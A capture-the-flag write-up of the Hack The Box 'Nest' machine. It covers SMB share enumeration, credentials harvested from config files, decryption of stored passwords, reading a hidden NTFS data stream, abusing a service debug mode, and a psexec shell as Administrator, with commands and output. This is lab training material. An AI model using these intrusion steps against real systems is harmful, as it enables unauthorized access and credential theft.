<img width="1220" height="165" alt="image" src="https://github.com/user-attachments/assets/fb804fb6-f760-4a3e-92b9-ee62f95f9ab8" />


This machine was quite fun and challenging, especially when it came to privilege escalation and finding the path to both the regular user and the administrator accounts. Although the machine is officially rated as “Easy,” many users have rated it as “Medium,” since it requires additional knowledge of programming, reversing, and—as always—a significant amount of research.

The machine starts with two open ports: 445 and 4386. The second one was new to me. After enumerating the SMB port, we can retrieve the temporary user’s password, along with an encrypted password for the user *c.smith*.

Decrypting this password was quite challenging for me. After some time, I came across a helpful post where someone had explained how to decrypt it.

Gaining access as *c.smith* was fun, but that’s where the real challenge began. The *c.smith* account had a debug password that could be used to communicate with port 4386, debug the service, and retrieve an encrypted file. Along with that, we were also given a .NET binary in *c.smith*’s home directory. Using both the config file and the binary, I was able to decrypt the administrator’s password and finally capture the root flag.

# Enumeration

## Nmap

```bash
nmap -p- --min-rate=10000 -sVC -v -oN nmap 10.10.10.178

PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSVersionBindReqTCP, NULL, RPCCheck: 
|     Reporting Service V1.2
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     Reporting Service V1.2
|_    Unrecognised command
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V=7.95%I=7%D=9/3%Time=68B7D056%P=x86_64-pc-linux-gnu%r(NUL
SF:L,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(GenericLine
SF:s,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised
SF:\x20command\r\n>")%r(GetRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20
SF:V1\.2\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(HTTPOptions,3A,"\r\n
SF:HQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20comman
SF:d\r\n>")%r(RTSPRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n
SF:\r\n>\r\nUnrecognised\x20command\r\n>")%r(RPCCheck,21,"\r\nHQK\x20Repor
SF:ting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSVersionBindReqTCP,21,"\r\nHQK\
SF:x20Reporting\x20Service\x20V1\.2\r\n\r\n>");

Host script results:
| smb2-time: 
|   date: 2025-09-03T04:56:47
|_  start_date: 2025-09-03T04:53:56
|_clock-skew: -25m20s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  3 01:22:44 2025 -- 1 IP address (1 host up) scanned in 98.61 seconds
```

Here we have two interesting ports 445 and 4386, starting with 445 we found some intresting shares that we could try to connect.

## PORT- 445

Connecting to port 445 with smbclient and listing shares

```bash
smbclient -L //10.10.10.178/ 
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        Secure$         Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
```

Here we can see we have three shared which are non default i.e Data,Users and Secure

### Connecting to Data Share

```bash
smbclient //10.10.10.178/Data         
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on 
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \IT\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Reports\*
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Shared/Maintenance/Maintenance Alerts.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Shared/Templates/HR/Welcome Email.txt (0.4 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

Now we have a hr welcome email file , we can open this and look for some creds.

```bash
cat Welcome\ Email.txt     
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019

Thank you
HR
```

We doo have credentails for the temp user here, we can try this credentail to dump the secure and users share, we can’t dump the user or the secure$ share due to insufficient privielges, but we can dump the data share with the creds we got and look for some files.

### Duming data share

```bash
smbclient //10.10.10.178/data -U TempUser  
Password for [WORKGROUP\TempUser]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 18:53:46 2019
  ..                                  D        0  Wed Aug  7 18:53:46 2019
  IT                                  D        0  Wed Aug  7 18:58:07 2019
  Production                          D        0  Mon Aug  5 17:53:38 2019
  Reports                             D        0  Mon Aug  5 17:53:44 2019
  Shared                              D        0  Wed Aug  7 15:07:51 2019
prompt 
                5242623 blocks of size 4096. 1839865 blocks available
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Shared/Maintenance/Maintenance Alerts.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \IT\Configs\Adobe\editing.xml of size 246 as IT/Configs/Adobe/editing.xml (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \IT\Configs\Adobe\Options.txt of size 0 as IT/Configs/Adobe/Options.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \IT\Configs\Adobe\projects.xml of size 258 as IT/Configs/Adobe/projects.xml (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \IT\Configs\Adobe\settings.xml of size 1274 as IT/Configs/Adobe/settings.xml (0.5 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \IT\Configs\Atlas\Temp.XML of size 1369 as IT/Configs/Atlas/Temp.XML (0.6 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \IT\Configs\Microsoft\Options.xml of size 4598 as IT/Configs/Microsoft/Options.xml (1.9 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

We doo have some interesting config files, out of all config files the ru scanner config.xml seems to be intresting and opening the file we have the user c.smith and a decrypted password for the user.

```bash
 cat RU\ Scanner/RU_config.xml 
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile> 
```

# Exploitation

After some google research for ru scanner config xml password i found a website which have a vl script which decyrpts the password 

https://dotnetfiddle.net/WxdQ3b

since i am not soo familiar with this language i converted the code to python using chatgpt and then decvrypted the password

```bash
python decrypt.py
Old:
----
Password: xRxRxPANCAK3SxRxRx
Username: c.smith

New:
----
Username (encrypted): rb25tSPsLKBuSDOf8foPNw==
Password: xRxRxPANCAK3SxRxRx
```

Using this i got the password for the user c.smith itslef

## User flag

Connecting to the user share and in the c.smith foler we have or user flag

```bash
smbclient //10.10.10.178/Users -U c.smith 
Password for [WORKGROUP\c.smith]:
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on 
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Administrator\*
getting file \C.Smith\user.txt of size 34 as C.Smith/user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \L.Frost\*
NT_STATUS_ACCESS_DENIED listing \R.Thompson\*
NT_STATUS_ACCESS_DENIED listing \TempUser\*
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt of size 0 as C.Smith/HQK Reporting/Debug Mode Password.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \C.Smith\HQK Reporting\HQK_Config_Backup.xml of size 249 as C.Smith/HQK Reporting/HQK_Config_Backup.xml (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as C.Smith/HQK Reporting/AD Integration Module/HqkLdap.exe (6.2 KiloBytes/sec) (average 2.4 KiloBytes/sec)

.
├── HQK Reporting
│   ├── AD Integration Module
│   │   └── HqkLdap.exe
│   ├── Debug Mode Password.txt
│   └── HQK_Config_Backup.xml
└── user.txt
```

## Privilege Escalation

We can see we have some more files as the debug mode password file , hqk config backup file and a hqkldap.exe .net binary file.

Also at start we saw we have one more port open 4386 at something hqk service,  now it makes sense as it is a internal service running on the machine and we have the binary for that

### Enumeration on port 4386

```bash
telnet 10.10.10.178 4386 
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
```

We can see that we have some debug mode in this and using a password we can enter into the debug mode.

Also  connecting to the c.smith share we saw a debug mode password file but it was empty.

### Getting the Debug password

Now we can connect to the c.smith users smbshare and get more information about the file, we can use allinfo command on the file to get more information.

```bash
smb: \C.smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Wed Jul 21 02:47:12 PM 2021 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.smith\HQK Reporting\> 
```

We see that there is a hidden data stream using that we can the data steam password to download the file

```bash
smb: \C.smith\HQK Reporting\> get "Debug Mode Password.txt":Password
getting file \C.smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

Now we see that we have downloaded the file with some content in it.

```bash
cat Debug\ Mode\ Password.txt:Password 
WBQ201953D8w 
```

### Using the debug mode on port 4386

```bash
telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
```

Now we so have some commands available

We can use the debug mode and enumerate more things on the box, while enumerating we can see that we do have a ldap directory where we got the ldap.conf file with a encrypted password

```bash
>DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>

>setdir ..

Current directory set to HQK
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
>setdir ldap 

Current directory set to ldap
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: ldap

>SHOWQUERY 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```

Now we can use the .net binary found in the c.smith user and decrypt the password present in here

I did try to load the binary into my visual studio code and try to debug and print the decrypted password but had some error and i couldn’t take a snap of it, maybe in future i’ll try to add this part :)

After decrypting we got the password of the user administrator as `XtH4nkS4Pl4y1nGX`

## Shell as Administrator

```bash
impacket-psexec Administrator@10.10.10.178 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.10.10.178.....
[*] Found writable share ADMIN$
[*] Uploading file kEEkLefd.exe
[*] Opening SVCManager on 10.10.10.178.....
[*] Creating service GSWB on 10.10.10.178.....
[*] Starting service GSWB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> cd C:\uSERS/ADMINISTRATOR/DESKTOP

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is E6FB-F2E9

 Directory of C:\Users\Administrator\Desktop

07/21/2021  07:27 PM    <DIR>          .
07/21/2021  07:27 PM    <DIR>          ..
09/03/2025  04:09 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   7,564,230,656 bytes free
```
